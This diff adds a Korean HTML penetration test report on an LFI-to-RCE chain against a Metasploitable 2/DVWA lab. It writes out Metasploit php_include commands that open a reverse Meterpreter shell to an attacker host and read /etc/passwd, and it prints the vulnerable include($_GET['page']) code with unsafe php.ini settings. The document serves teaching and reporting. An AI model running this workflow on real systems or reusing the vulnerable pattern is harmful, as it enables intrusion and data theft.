@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="ko" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Penetration Testing Result Report</title>
+    <script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@300;400;500;700;900&family=Fira+Code:wght@400;500&display=swap');
+        body { 
+            font-family: 'Noto Sans KR', sans-serif; 
+            background-color: #020617; 
+            color: #f8fafc; 
+            margin: 0; padding: 0;
+            line-height: 1.8;
+        }
+        .terminal-bg { background-color: #020617; border: 1px solid #1e293b; }
+        .text-glow { text-shadow: 0 0 10px rgba(34, 211, 238, 0.4); }
+        .section-card { background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(51, 65, 85, 0.5); backdrop-blur: xl; }
+        .code-block { font-family: 'Fira Code', monospace; }
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #0ea5e9; }
+        .footnote { font-size: 0.85rem; color: #94a3b8; border-top: 1px dashed #334155; padding-top: 0.5rem; margin-top: 1rem; }
+        .terminal-text { white-space: pre-wrap; word-break: break-all; }
+        
+        /* Table Styling */
+        .cyber-table { width: 100%; border-collapse: separate; border-spacing: 0; }
+        .cyber-table th { background: rgba(30, 41, 59, 0.8); color: #38bdf8; font-weight: 700; padding: 1rem; text-align: left; border-bottom: 2px solid #0ea5e9; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 0.05em; }
+        .cyber-table td { padding: 1rem; border-bottom: 1px solid rgba(51, 65, 85, 0.5); color: #cbd5e1; font-size: 0.95rem; vertical-align: top; }
+        .cyber-table tr:hover td { background: rgba(15, 23, 42, 0.8); }
+        .cyber-table tr:last-child td { border-bottom: none; }
+
+        /* Highlight classes */
+        .cmd-input { color: #22d3ee; font-weight: 700; }
+        .cmd-output { color: #94a3b8; }
+        .cmd-success { color: #34d399; font-weight: 700; }
+        .cmd-warning { color: #fbbf24; }
+        .cmd-error { color: #f87171; }
+        .cmd-comment { color: #64748b; font-style: italic; }
+        
+        .report-header-bg { background: linear-gradient(135deg, rgba(15, 23, 42, 0.9) 0%, rgba(2, 6, 23, 0.95) 100%); }
+    </style>
+</head>
+<body class="antialiased pb-20">
+
+    <!-- Header: 기술 사양 및 타이틀 -->
+    <header class="border-b border-slate-800 report-header-bg sticky top-0 z-50 backdrop-blur-md">
+        <div class="max-w-6xl mx-auto px-6 py-10 flex justify-between items-center">
+            <div>
+                <div class="flex items-center gap-2 mb-3">
+                    <span class="bg-red-600 text-white px-3 py-1 text-[10px] font-black uppercase tracking-widest rounded-sm shadow-[0_0_15px_rgba(220,38,38,0.6)]">Confidential Report</span>
+                    <span class="text-slate-400 font-mono text-[11px]">SEC-REP-2026-001 | Penetration Testing Result</span>
+                </div>
+                <h1 class="text-4xl font-black text-transparent bg-clip-text bg-gradient-to-r from-red-400 via-rose-500 to-orange-500 tracking-tight leading-tight">
+                    웹 애플리케이션 모의 해킹 결과 보고서<br><span class="text-slate-100 text-2xl font-bold">대상: Metasploitable 2 웹 인프라스트럭처</span>
+                </h1>
+            </div>
+            <div class="text-right hidden md:block border-l border-slate-700 pl-8">
+                <div class="bg-red-900/40 text-red-400 border border-red-500/30 px-5 py-3 rounded-xl text-sm font-black font-mono shadow-lg flex flex-col items-end">
+                    <span class="text-[10px] text-slate-400 mb-1">OVERALL RISK RATING</span>
+                    CRITICAL (위험도 최고)
+                </div>
+                <p class="text-[10px] text-slate-500 mt-3 tracking-widest uppercase">System Architect Pro</p>
+            </div>
+        </div>
+    </header>
+
+    <main class="max-w-6xl mx-auto px-6 py-16 space-y-32">
+
+        <!-- 섹션 1: 경영진 요약 -->
+        <section>
+            <h2 class="text-3xl font-black border-l-4 border-red-500 pl-4 text-slate-100 mb-10 tracking-tight flex items-center gap-3">
+                <i data-lucide="pie-chart" class="w-8 h-8 text-red-400"></i> 경영진 요약 (Executive Summary)
+            </h2>
+            <div class="section-card rounded-3xl p-12 shadow-2xl">
+                <p class="text-slate-300 text-lg mb-10 leading-relaxed block">
+                    본 보고서는 가상의 엔터프라이즈 환경인 Metasploitable 2 웹 인프라를 대상으로 수행된 블랙박스(Black-box) 기반 <strong>침투 테스트(Penetration Testing, 페너트레이션 테스팅)</strong> 결과를 요약합니다. 진단 결과, 대상 웹 애플리케이션에서 치명적인 <strong>Directory Traversal (디렉터리 경로 우회)</strong> 및 <strong>LFI (Local File Inclusion, 로컬 파일 포함)</strong> 취약점이 발견되었으며, 이를 통해 외부 공격자가 서버의 제어권을 완전히 탈취하는 <strong>RCE (Remote Code Execution, 원격 코드 실행)</strong>로 연계될 수 있음을 기술적으로 증명하였습니다.
+                </p>
+
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-10">
+                    <div class="bg-slate-900/60 p-6 rounded-2xl border border-slate-700 text-center">
+                        <div class="text-slate-400 text-xs font-bold uppercase tracking-widest mb-2">진단 대상 IP</div>
+                        <div class="text-2xl font-mono font-black text-cyan-400">192.168.1.100</div>
+                    </div>
+                    <div class="bg-slate-900/60 p-6 rounded-2xl border border-red-900/50 text-center">
+                        <div class="text-slate-400 text-xs font-bold uppercase tracking-widest mb-2">발견된 최고 위협</div>
+                        <div class="text-2xl font-black text-red-500">LFI to RCE</div>
+                    </div>
+                    <div class="bg-slate-900/60 p-6 rounded-2xl border border-slate-700 text-center">
+                        <div class="text-slate-400 text-xs font-bold uppercase tracking-widest mb-2">침투 성공 여부</div>
+                        <div class="text-2xl font-black text-emerald-500">SYSTEM COMPROMISED</div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="footnote mt-8 text-sm">
+                * <strong>Black-box Testing (블랙박스 테스트):</strong> 평가 대상 시스템의 내부 소스 코드나 아키텍처 정보가 전혀 제공되지 않은 상태에서, 외부 해커와 동일한 조건으로 수행하는 모의 해킹 방식입니다.<br>
+                * <strong>System Compromised (시스템 장악):</strong> 공격자가 타겟 서버의 관리자 또는 시스템 구동 권한을 획득하여 서버를 완전히 통제할 수 있는 상태에 이르렀음을 의미합니다.
+            </div>
+        </section>
+
+        <!-- 섹션 2: 진단 방법론 및 범위 -->
+        <section>
+            <h2 class="text-3xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-10 tracking-tight flex items-center gap-3">
+                <i data-lucide="target" class="w-8 h-8 text-cyan-400"></i> 진단 방법론 및 범위 (Methodology & Scope)
+            </h2>
+            <div class="section-card rounded-3xl p-12 shadow-2xl space-y-10">
+                <p class="text-slate-300 text-lg leading-relaxed block">
+                    본 평가는 OWASP Top 10 웹 애플리케이션 보안 취약점 기준을 준수하여 진행되었으며, 업계 표준 침투 테스트 프레임워크인 <strong>Metasploit Framework (MSF, 메타스플로잇 프레임워크)</strong>를 핵심 도구로 활용하였습니다. 진단 범위와 환경은 다음과 같이 엄격히 통제되었습니다.
+                </p>
+
+                <div class="overflow-x-auto rounded-xl border border-slate-700 shadow-lg">
+                    <table class="cyber-table">
+                        <thead>
+                            <tr>
+                                <th class="w-1/4">구분</th>
+                                <th>상세 내용</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td class="font-bold text-slate-200">진단 대상 (Target)</td>
+                                <td class="font-mono text-cyan-300">192.168.1.100 (Metasploitable 2 - Linux Ubuntu 기반)</td>
+                            </tr>
+                            <tr>
+                                <td class="font-bold text-slate-200">공격 환경 (Attacker)</td>
+                                <td class="font-mono text-slate-300">192.168.1.50 (Kali Linux 2026.1 / MSF Console v6.3)</td>
+                            </tr>
+                            <tr>
+                                <td class="font-bold text-slate-200">핵심 대상 서비스</td>
+                                <td>Apache HTTP Server 2.2.8 / DVWA (Damn Vulnerable Web Application)</td>
+                            </tr>
+                            <tr>
+                                <td class="font-bold text-slate-200">사용된 방법론</td>
+                                <td>정보 수집(Reconnaissance) &rarr; 취약점 스캐닝(Scanning) &rarr; 익스플로잇(Exploitation) &rarr; 권한 획득(Post-Exploitation)</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            
+            <div class="footnote mt-8 text-sm">
+                * <strong>OWASP (Open Web Application Security Project, 오픈 웹 애플리케이션 보안 프로젝트):</strong> 전 세계 웹 보안 전문가들이 모여 만든 비영리 단체로, 웹 환경에서 가장 치명적인 10대 취약점(OWASP Top 10)을 주기적으로 발표합니다.
+            </div>
+        </section>
+
+        <!-- 섹션 3: 위협 아키텍처 모델링 -->
+        <section>
+            <h2 class="text-3xl font-black border-l-4 border-indigo-500 pl-4 text-slate-100 mb-10 tracking-tight flex items-center gap-3">
+                <i data-lucide="network" class="w-8 h-8 text-indigo-400"></i> 위협 모델링 및 공격 아키텍처 (Threat Architecture)
+            </h2>
+            <div class="section-card rounded-3xl p-12 shadow-2xl">
+                <p class="text-slate-300 text-lg mb-12 leading-relaxed block">
+                    이번 진단에서 검증된 핵심 공격 벡터(Attack Vector)는 웹 서버의 파일 포함(Include) 기능 결함을 역이용한 <strong>원격 쉘(Remote Shell) 연결 아키텍처</strong>입니다. 공격자는 악성 PHP 코드를 Base64로 인코딩하여 전송하고, 서버가 이를 디코딩 및 실행하게 만듦으로써 방화벽을 우회하는 역방향 연결(Reverse TCP)을 확립했습니다.
+                </p>
+
+                <!-- 도식 1: 침투 아키텍처 -->
+                <div class="bg-slate-900/80 border border-slate-800 rounded-2xl p-10 shadow-inner my-10">
+                    <h4 class="text-center font-bold text-slate-400 mb-10 text-sm tracking-widest uppercase">
+                        [도식 1: LFI 취약점을 악용한 Reverse TCP 세션 수립 구조도]
+                    </h4>
+                    <div class="flex flex-col lg:flex-row items-center justify-center gap-6">
+                        
+                        <!-- 공격자 -->
+                        <div class="flex-1 text-center p-8 bg-slate-800/80 rounded-2xl border border-cyan-700 shadow-lg w-full max-w-xs">
+                            <i data-lucide="laptop-2" class="w-14 h-14 text-cyan-400 mx-auto mb-4"></i>
+                            <div class="font-black text-slate-100">Attacker (Kali)</div>
+                            <div class="text-xs text-slate-400 mt-2 font-mono">IP: 192.168.1.50</div>
+                            <div class="mt-4 p-3 bg-slate-900 rounded border border-cyan-900 text-[10px] text-cyan-300 font-mono text-left">
+                                <i data-lucide="ear" class="inline w-3 h-3 mr-1"></i> Listening on Port 4444<br>
+                                <span class="text-slate-500">(Waiting for reverse shell...)</span>
+                            </div>
+                        </div>
+
+                        <!-- 양방향 통신 -->
+                        <div class="flex flex-col items-center justify-center w-32 relative">
+                            <!-- Payload 전송 -->
+                            <div class="flex flex-col items-center absolute -top-12">
+                                <div class="text-[10px] text-yellow-400 font-bold mb-1 uppercase">1. Malicious Payload</div>
+                                <i data-lucide="arrow-right" class="w-6 h-6 text-yellow-600"></i>
+                            </div>
+                            <!-- 리버스 쉘 연결 -->
+                            <div class="flex flex-col items-center absolute top-12">
+                                <i data-lucide="arrow-left" class="w-6 h-6 text-emerald-600"></i>
+                                <div class="text-[10px] text-emerald-400 font-bold mt-1 uppercase">2. Reverse Shell</div>
+                            </div>
+                        </div>
+
+                        <!-- 타겟 서버 -->
+                        <div class="flex-1 text-center p-8 bg-slate-800/80 rounded-2xl border border-red-700 shadow-lg w-full max-w-xs">
+                            <i data-lucide="server-crash" class="w-14 h-14 text-red-400 mx-auto mb-4"></i>
+                            <div class="font-black text-slate-100">Target Server</div>
+                            <div class="text-xs text-slate-400 mt-2 font-mono">IP: 192.168.1.100</div>
+                            <div class="mt-4 p-3 bg-slate-900 rounded border border-red-900 text-[10px] text-red-300 font-mono text-left">
+                                <i data-lucide="cpu" class="inline w-3 h-3 mr-1"></i> Executing Payload<br>
+                                <span class="text-slate-500">Connecting back to Attacker</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="footnote mt-8 text-sm">
+                * <strong>Attack Vector (공격 벡터):</strong> 해커가 대상 시스템에 침투하기 위해 이용하는 경로, 수단, 또는 기법을 의미합니다.<br>
+                * <strong>Reverse TCP (역방향 연결):</strong> 타겟 서버가 방화벽(Firewall)에 의해 외부 접속이 차단되어 있을 때, 반대로 타겟 서버 내부에서 공격자의 PC를 향해 아웃바운드(Outbound) 연결을 시도하게 하여 방화벽을 우회하는 페이로드 기술입니다.
+            </div>
+        </section>
+
+        <!-- 섹션 4: 취약점 상세 요약표 -->
+        <section>
+            <h2 class="text-3xl font-black border-l-4 border-rose-500 pl-4 text-slate-100 mb-10 tracking-tight flex items-center gap-3">
+                <i data-lucide="shield-alert" class="w-8 h-8 text-rose-400"></i> 검출된 취약점 요약 (Vulnerability Details)
+            </h2>
+            <div class="section-card rounded-3xl p-12 shadow-2xl">
+                
+                <div class="bg-red-900/20 border border-red-500/30 rounded-2xl p-8 mb-8">
+                    <div class="flex justify-between items-start mb-6">
+                        <div>
+                            <h3 class="text-2xl font-bold text-slate-100">Directory Traversal & LFI</h3>
+                            <p class="text-slate-400 text-sm mt-2">CWE-22: Improper Limitation of a Pathname to a Restricted Directory</p>
+                        </div>
+                        <div class="bg-red-600 text-white px-4 py-2 rounded-lg font-black text-xl shadow-[0_0_15px_rgba(220,38,38,0.5)]">
+                            CVSS: 9.8 (CRITICAL)
+                        </div>
+                    </div>
+                    
+                    <p class="text-slate-300 leading-relaxed text-sm mb-6 block">
+                        웹 애플리케이션 파라미터(<code>?page=</code>)에서 상위 디렉터리 이동 문자(<code>../</code>)를 필터링하지 않아, 공격자가 시스템 내의 임의 파일을 열람할 수 있습니다. 또한, PHP의 <code>allow_url_include</code> 옵션이 활성화된 환경 설정 오류와 결합되어, 외부의 악성 코드를 서버 내부에서 실행할 수 있는 원격 코드 실행(RCE) 취약점으로 에스컬레이션(Escalation, 권한 상승) 되었습니다.
+                    </p>
+                </div>
+
+            </div>
+            
+            <div class="footnote mt-8 text-sm">
+                * <strong>CVSS (Common Vulnerability Scoring System, 공통 취약점 등급 시스템):</strong> 취약점의 심각도를 0점부터 10점까지 수치화하여 평가하는 국제 표준 점수 체계입니다. 9.0 이상은 최고 수준의 위험(Critical)을 의미합니다.<br>
+                * <strong>CWE (Common Weakness Enumeration, 공통 약점 목록):</strong> 소프트웨어 보안 취약점을 유발하는 근본적인 약점들을 분류하고 고유 번호를 부여한 사전입니다.
+            </div>
+        </section>
+
+        <!-- 섹션 5: 실증 (PoC) 1 - 정보 수집 -->
+        <section>
+            <h2 class="text-3xl font-black border-l-4 border-emerald-500 pl-4 text-slate-100 mb-10 tracking-tight flex items-center gap-3">
+                <i data-lucide="search" class="w-8 h-8 text-emerald-400"></i> 공격 실증 (PoC): 1단계 - 정찰 및 스캐닝
+            </h2>
+            <div class="section-card rounded-3xl p-12 shadow-2xl space-y-8">
+                <p class="text-slate-300 text-lg leading-relaxed block">
+                    침투 테스트의 첫 단계로, Metasploit 내부에서 Nmap을 구동하여 대상 서버의 웹 서비스 가동 여부와 버전을 파악했습니다. 스캔 결과는 데이터베이스에 영구 기록되었습니다.
+                </p>
+
+                <div class="bg-slate-900/90 rounded-xl p-8 shadow-inner relative border border-slate-700 overflow-x-auto">
+                    <div class="absolute top-4 right-4 text-slate-600 text-[10px] uppercase font-black flex items-center gap-2"><div class="w-3 h-3 rounded-full bg-red-500"></div><div class="w-3 h-3 rounded-full bg-yellow-500"></div><div class="w-3 h-3 rounded-full bg-green-500"></div></div>
+                    
+                    <div class="terminal-text mb-6"><span class="cmd-output">msf6 ></span> <span class="cmd-input">db_nmap -p 80 -sV 192.168.1.100</span>
+<span class="cmd-comment"># [보고서 해설] 대상 서버 192.168.1.100의 80번 포트(HTTP)를 집중적으로 스캔(Scanning)하고, 구동 중인 서비스의 버전을 검출(-sV)하여 백엔드 DB에 저장합니다.</span></div>
+                    
+                    <div class="terminal-text mb-6"><span class="cmd-output">[*] Nmap: Starting Nmap 7.93 ( https://nmap.org ) at 2026-03-19 10:15 KST
+[*] Nmap: Nmap scan report for 192.168.1.100
+[*] Nmap: PORT   STATE SERVICE VERSION</span>
+<span class="cmd-success">[*] Nmap: 80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)</span>
+<span class="cmd-comment"># [보고서 해설] 스캔 결과, 보안 패치가 중단된 심각한 구버전인 Apache 2.2.8 웹 서버가 동작 중임을 확인했습니다. 공격 표면(Attack Surface)이 광범위함을 시사합니다.</span></div>
+                </div>
+            </div>
+            
+            <div class="footnote mt-8 text-sm">
+                * <strong>PoC (Proof of Concept, 개념 증명):</strong> 발견된 취약점이 실제로 악용될 수 있음을 증명하기 위해 만든 시연 코드나 공격 수행 과정을 의미합니다. 보고서의 핵심 증빙 자료입니다.
+            </div>
+        </section>
+
+        <!-- 섹션 6: 실증 (PoC) 2 - 취약점 공격(Exploitation) -->
+        <section>
+            <h2 class="text-3xl font-black border-l-4 border-purple-500 pl-4 text-slate-100 mb-10 tracking-tight flex items-center gap-3">
+                <i data-lucide="zap" class="w-8 h-8 text-purple-400"></i> 공격 실증 (PoC): 2단계 - 취약점 익스플로잇
+            </h2>
+            <div class="section-card rounded-3xl p-12 shadow-2xl space-y-8">
+                <p class="text-slate-300 text-lg leading-relaxed block">
+                    정보 수집 결과를 바탕으로, DVWA 애플리케이션의 File Inclusion(파일 포함) 취약점 경로를 타겟팅합니다. <code>php_include</code> 모듈을 사용하여 PHP Data Wrapper(데이터 래퍼) 기반의 메모리 인젝션(Memory Injection) 공격을 수행합니다.
+                </p>
+
+                <div class="bg-slate-900/90 rounded-xl p-8 shadow-inner relative border border-slate-700 overflow-x-auto">
+                    <div class="absolute top-4 right-4 text-slate-600 text-[10px] uppercase font-black flex items-center gap-2"><div class="w-3 h-3 rounded-full bg-red-500"></div><div class="w-3 h-3 rounded-full bg-yellow-500"></div><div class="w-3 h-3 rounded-full bg-green-500"></div></div>
+                    
+                    <div class="terminal-text mb-6"><span class="cmd-output">msf6 ></span> <span class="cmd-input">use exploit/unix/webapp/php_include</span>
+<span class="cmd-output">msf6 exploit(unix/webapp/php_include) ></span> <span class="cmd-input">set RHOSTS 192.168.1.100</span>
+<span class="cmd-output">msf6 exploit(...) ></span> <span class="cmd-input">set LHOST eth0</span>
+<span class="cmd-comment"># [보고서 해설] 공격 대상 IP(RHOSTS)와 역방향 쉘을 수신할 공격자 본인의 네트워크 인터페이스(LHOST, eth0)를 매핑합니다.</span></div>
+
+                    <div class="terminal-text mb-6"><span class="cmd-output">msf6 exploit(...) ></span> <span class="cmd-input">set PATH /dvwa/vulnerabilities/fi/</span>
+<span class="cmd-output">msf6 exploit(...) ></span> <span class="cmd-input">set POSTDATA "page=XXpathXX"</span>
+<span class="cmd-output">msf6 exploit(...) ></span> <span class="cmd-input">set HEADERS "Cookie: security=low; PHPSESSID=e1b2c3d4..."</span>
+<span class="cmd-comment"># [보고서 해설] 취약점이 존재하는 정확한 엔드포인트(Endpoint) 경로를 설정하고, 공격 코드가 주입될 파라미터 위치(XXpathXX)를 지정합니다. 접근 제어 우회를 위해 세션 쿠키를 함께 주입합니다.</span></div>
+
+                    <div class="terminal-text mb-6"><span class="cmd-output">msf6 exploit(...) ></span> <span class="cmd-input">exploit</span>
+<span class="cmd-output">[*] Started reverse TCP handler on 192.168.1.50:4444
+[*] Sending stage (39282 bytes) to 192.168.1.100</span>
+<span class="cmd-success">[*] Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.100:53124)</span>
+<span class="cmd-comment"># [보고서 해설] 공격 코드 전송 결과, 대상 서버의 PHP 프로세스가 악성 쉘 코드를 실행하여 공격자에게 미터프리터(Meterpreter) 대화형 세션을 연결해 주었습니다. 1차 침투에 성공했습니다.</span></div>
+                </div>
+            </div>
+            
+            <div class="footnote mt-8 text-sm">
+                * <strong>Endpoint (엔드포인트):</strong> API나 웹 애플리케이션에서 사용자가 접속하거나 데이터를 요청할 수 있는 구체적인 URL 경로 지점을 의미합니다.<br>
+                * <strong>Meterpreter (미터프리터):</strong> 메모리 상에서만 동작하여 파일 기반 백신 탐지를 우회하고 대상 시스템을 강력하게 제어할 수 있는 고급 페이로드 쉘입니다.
+            </div>
+        </section>
+
+        <!-- 섹션 7: 실증 (PoC) 3 - 시스템 장악 증명 -->
+        <section>
+            <h2 class="text-3xl font-black border-l-4 border-orange-500 pl-4 text-slate-100 mb-10 tracking-tight flex items-center gap-3">
+                <i data-lucide="key" class="w-8 h-8 text-orange-400"></i> 공격 실증 (PoC): 3단계 - 시스템 권한 탈취 증명
+            </h2>
+            <div class="section-card rounded-3xl p-12 shadow-2xl space-y-8">
+                <p class="text-slate-300 text-lg leading-relaxed block">
+                    침투 테스트의 최종 단계로, 획득한 세션이 대상 서버의 어느 범위까지 권한을 미치는지 확인합니다. 이 단계는 실제 데이터 유출이 가능한 상태임을 증명하는 핵심 부분입니다.
+                </p>
+
+                <div class="bg-slate-900/90 rounded-xl p-8 shadow-inner relative border border-slate-700 overflow-x-auto">
+                    <div class="absolute top-4 right-4 text-slate-600 text-[10px] uppercase font-black flex items-center gap-2"><div class="w-3 h-3 rounded-full bg-red-500"></div><div class="w-3 h-3 rounded-full bg-yellow-500"></div><div class="w-3 h-3 rounded-full bg-green-500"></div></div>
+                    
+                    <div class="terminal-text mb-6"><span class="cmd-warning">meterpreter ></span> <span class="cmd-input">sysinfo</span>
+<span class="cmd-output">Computer    : metasploitable
+OS          : Linux metasploitable 2.6.24-16-server #1 SMP
+Meterpreter : php/linux</span>
+<span class="cmd-comment"># [보고서 해설] 장악된 타겟 서버의 운영체제 및 커널(Kernel) 버전을 출력합니다. 이 정보를 바탕으로 추가적인 권한 상승(Privilege Escalation) 익스플로잇을 탐색할 수 있습니다.</span></div>
+
+                    <div class="terminal-text mb-6"><span class="cmd-warning">meterpreter ></span> <span class="cmd-input">getuid</span>
+<span class="cmd-error font-bold">Server username: www-data (33)</span>
+<span class="cmd-comment"># [보고서 해설] 웹 데몬을 실행하는 시스템 계정인 www-data 권한을 획득했습니다. 웹 루트 디렉터리 내의 소스 코드와 데이터베이스 접속 정보(Config 파일)를 전부 탈취할 수 있는 상태입니다.</span></div>
+
+                    <div class="terminal-text mb-6"><span class="cmd-warning">meterpreter ></span> <span class="cmd-input">cat /etc/passwd</span>
+<span class="cmd-output">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash</span>
+<span class="cmd-comment"># [보고서 해설] 관리자 및 사용자 계정 정보가 담긴 운영체제의 핵심 시스템 파일을 무단으로 열람하는 데 성공했습니다. 완전한 데이터 침해(Data Breach)가 발생했음을 증명합니다.</span></div>
+                </div>
+            </div>
+            
+            <div class="footnote mt-8 text-sm">
+                * <strong>Privilege Escalation (권한 상승):</strong> 일반 사용자나 웹 서비스 권한(www-data)에서 시스템 최고 관리자 권한(root 또는 SYSTEM)으로 권한 수준을 높이는 공격 기법입니다.<br>
+                * <strong>Data Breach (데이터 침해):</strong> 권한이 없는 자에 의해 기밀 데이터가 노출, 탈취, 수정되는 심각한 보안 사고를 의미합니다.
+            </div>
+        </section>
+
+        <!-- 섹션 8: 비즈니스 및 시스템 영향도 분석 -->
+        <section>
+            <h2 class="text-3xl font-black border-l-4 border-yellow-500 pl-4 text-slate-100 mb-10 tracking-tight flex items-center gap-3">
+                <i data-lucide="activity" class="w-8 h-8 text-yellow-400"></i> 비즈니스 및 시스템 영향도 (Business Impact Analysis)
+            </h2>
+            <div class="section-card rounded-3xl p-12 shadow-2xl space-y-8">
+                <p class="text-slate-300 text-lg leading-relaxed block">
+                    본 취약점이 실제 상용 엔터프라이즈 환경에서 방치될 경우, 기업이 입을 수 있는 보안 및 비즈니스 측면의 치명적인 영향도를 아키텍트 관점에서 분석합니다.
+                </p>
+
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                    <div class="bg-slate-800/60 p-8 rounded-2xl border border-red-900/50">
+                        <i data-lucide="database-zap" class="w-10 h-10 text-red-500 mb-4"></i>
+                        <h3 class="text-xl font-bold text-slate-100 mb-3">1. 핵심 고객 데이터베이스 탈취</h3>
+                        <p class="text-sm text-slate-400 leading-relaxed">
+                            웹 쉘 권한(www-data) 획득으로 인해 <code>wp-config.php</code> 등 웹 서버에 저장된 DB 접속 자격 증명(Credentials)이 노출됩니다. 공격자는 이를 통해 데이터베이스에 직접 접속하여 고객의 개인정보 및 결제 정보를 전부 덤프(Dump)하여 탈취할 수 있습니다.
+                        </p>
+                    </div>
+                    
+                    <div class="bg-slate-800/60 p-8 rounded-2xl border border-orange-900/50">
+                        <i data-lucide="network" class="w-10 h-10 text-orange-500 mb-4"></i>
+                        <h3 class="text-xl font-bold text-slate-100 mb-3">2. 내부망 측면 이동 (Lateral Movement)</h3>
+                        <p class="text-sm text-slate-400 leading-relaxed">
+                            장악된 웹 서버는 <strong>피봇팅(Pivoting)</strong>의 교두보가 됩니다. 공격자는 해당 서버를 프록시로 삼아 인터넷에 노출되지 않은 사내 인트라넷, 인사 시스템, 재무 서버 등 내부망으로 공격 범위를 심층적으로 확대할 수 있습니다.
+                        </p>
+                    </div>
+
+                    <div class="bg-slate-800/60 p-8 rounded-2xl border border-yellow-900/50">
+                        <i data-lucide="file-warning" class="w-10 h-10 text-yellow-500 mb-4"></i>
+                        <h3 class="text-xl font-bold text-slate-100 mb-3">3. 랜섬웨어 감염 및 서비스 중단</h3>
+                        <p class="text-sm text-slate-400 leading-relaxed">
+                            운영체제 명령어 실행 권한을 통해 서버 주요 파티션을 암호화하는 랜섬웨어(Ransomware) 페이로드를 다운로드 및 실행할 수 있습니다. 이는 즉각적인 서비스 거부(DoS) 상태를 초래하며 비즈니스 연속성을 파괴합니다.
+                        </p>
+                    </div>
+
+                    <div class="bg-slate-800/60 p-8 rounded-2xl border border-indigo-900/50">
+                        <i data-lucide="scale" class="w-10 h-10 text-indigo-500 mb-4"></i>
+                        <h3 class="text-xl font-bold text-slate-100 mb-3">4. 규제 위반 및 브랜드 가치 훼손</h3>
+                        <p class="text-sm text-slate-400 leading-relaxed">
+                            개인정보보호법 등 정보보안 관련 법령 위반으로 인한 막대한 과징금이 부과되며, 침해 사고 공시에 따른 대고객 신뢰도 하락과 집단 소송 등 수습이 불가능한 수준의 브랜드 손실이 발생합니다.
+                        </p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="footnote mt-8 text-sm">
+                * <strong>Lateral Movement (측면 이동):</strong> 최초 침투한 시스템을 발판으로 삼아, 네트워크 내부의 다른 중요 서버나 단말기로 이동하며 공격 범위를 넓히는 고도화된 해킹 전술입니다.<br>
+                * <strong>Pivoting (피봇팅):</strong> 공격자가 장악한 시스템을 라우터나 프록시처럼 활용하여 방화벽 안쪽의 다른 시스템을 우회 타격하는 네트워크 터널링 기술입니다.
+            </div>
+        </section>
+
+        <!-- 섹션 9: 근본 원인 분석 -->
+        <section>
+            <h2 class="text-3xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-10 tracking-tight flex items-center gap-3">
+                <i data-lucide="code-2" class="w-8 h-8 text-cyan-400"></i> 근본 원인 분석 (Root Cause Analysis)
+            </h2>
+            <div class="section-card rounded-3xl p-12 shadow-2xl space-y-10">
+                <p class="text-slate-300 text-lg leading-relaxed block">
+                    본 취약점이 발생한 기술적인 <strong>근본 원인(Root Cause)</strong>은 애플리케이션의 시큐어 코딩(Secure Coding) 누락과 서버 레벨의 취약한 환경 설정이 결합된 전형적인 복합 보안 결함입니다.
+                </p>
+
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                    <!-- 원인 1: 소스 코드 -->
+                    <div class="bg-black/40 p-8 rounded-2xl border border-slate-700">
+                        <h3 class="text-xl font-bold text-red-400 mb-4">1. 시큐어 코딩 부재 (입력값 검증 누락)</h3>
+                        <div class="bg-slate-900 p-4 rounded-xl font-mono text-sm text-slate-400 mb-4 border border-slate-800">
+                            <span class="text-blue-400">$file</span> = <span class="text-green-400">$_GET</span>['page'];<br>
+                            <span class="text-red-500 font-bold bg-red-900/30">include($file);</span>
+                        </div>
+                        <p class="text-sm text-slate-300 leading-relaxed">
+                            웹 개발 시 <code>include()</code>나 <code>require()</code> 함수를 사용하여 동적으로 페이지를 불러올 때, 사용자가 전달한 파라미터(<code>$_GET['page']</code>)를 아무런 위협 필터링 없이 그대로 파일 시스템에 전달했습니다. 이로 인해 경로 조작(<code>../</code>)이 가능해졌습니다.
+                        </p>
+                    </div>
+
+                    <!-- 원인 2: 환경 설정 -->
+                    <div class="bg-black/40 p-8 rounded-2xl border border-slate-700">
+                        <h3 class="text-xl font-bold text-red-400 mb-4">2. php.ini 환경 설정 결함</h3>
+                        <div class="bg-slate-900 p-4 rounded-xl font-mono text-sm text-slate-400 mb-4 border border-slate-800">
+                            allow_url_fopen = <span class="text-red-500 font-bold">On</span><br>
+                            allow_url_include = <span class="text-red-500 font-bold">On</span>
+                        </div>
+                        <p class="text-sm text-slate-300 leading-relaxed">
+                            PHP의 전역 설정 파일인 <code>php.ini</code>에서, 원격지의 URL(예: 외부 해커 서버의 악성 스크립트나 Base64 데이터 스트림)을 로컬 파일처럼 포함시켜 실행하게 해주는 극도로 위험한 옵션이 켜져 있었습니다. 이 설정이 LFI를 RCE로 격상시켰습니다.
+                        </p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="footnote mt-8 text-sm">
